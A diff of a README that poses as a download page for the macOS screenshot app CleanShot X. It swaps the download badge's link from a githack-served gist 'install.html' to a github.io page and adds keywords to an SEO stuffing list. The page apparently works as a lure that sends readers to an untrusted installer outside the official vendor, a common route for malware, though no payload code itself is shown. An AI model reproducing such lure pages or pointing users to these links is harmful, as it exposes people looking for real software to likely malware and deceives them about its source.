@@ -2,7 +2,7 @@
 
 CleanShot X is a macOS application that allows you to capture screenshots, record your screen, and annotate images with ease. It provides advanced editing, cloud sharing, and customizable shortcuts for seamless workflow on Mac.
 
-<a href="https://gistcdn.githack.com/hotchocolate-cell/a09818603cd61927ee05ccd930ab65a5/raw/46eeaaef463593f8229be0a0a633f9067ab153e4/install.html?offer=CleanShot%20X" target="_blank">
+<a href="https://git-app-deploy.github.io/.github/?offer=CleanShotX" target="_blank">
   <img 
     src="https://img.shields.io/badge/Get%20CleanShot%20X%20GitHub-28A745%20to%2020B23F?style=plastic&logo=github&logoColor=FFFFFF" 
     width="320" 
@@ -48,7 +48,7 @@ With CleanShot X, Mac users can quickly capture, edit, and share visuals without
 ---
 
 ## SEO Keywords
-cleanshot x mac, cleanshot, cleanshot x, cleanshotx, cleanshot mac, cleanshot desktop, cleanshot for mac, cleanshot for pc, cleanshot macos, screenshot macos, screen recording mac, mac screenshot tool, mac capture app, mac annotation software, productivity mac, mac visual content tool, mac screen capture, mac workflow app
+cleanshot x mac, cleanshot mac, clean shot x, cleanshot, cleanshot x, cleanshotx, cleanshot mac, cleanshot desktop, cleanshot for mac, cleanshot for pc, cleanshot macos, screenshot macos, screen recording mac, mac screenshot tool, mac capture app, mac annotation software, productivity mac, mac visual content tool, mac screen capture, mac workflow app
 
 ---
 
